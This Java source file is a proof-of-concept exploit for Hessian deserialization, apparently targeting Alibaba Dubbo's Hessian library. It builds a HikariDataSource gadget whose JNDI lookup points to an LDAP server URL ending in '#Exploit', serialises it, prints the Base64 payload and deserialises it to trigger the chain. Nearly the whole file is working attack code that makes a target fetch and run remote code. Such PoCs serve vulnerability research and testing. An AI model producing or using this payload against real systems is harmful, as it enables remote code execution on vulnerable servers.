package com.example.poc.securityPoc.demo;



import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.example.poc.securityPoc.beans.Beans;
import com.zaxxer.hikari.HikariDataSource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HikariDataSource ds = new HikariDataSource();
        ds.setPoolName("pool");
        ds.setDataSourceJNDI("ldap://127.0.0.1:8099/#Exploit");
        Hessian2Output out = new Hessian2Output(byteArrayOutputStream);
        Object o = new Beans( ds, com.zaxxer.hikari.HikariDataSource.class);
        out.writeString("aaa");
        out.writeObject(o);
        out.flushBuffer();
        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream((byteArrayOutputStream.toByteArray())));
        hessian2Input.readObject();
    }
}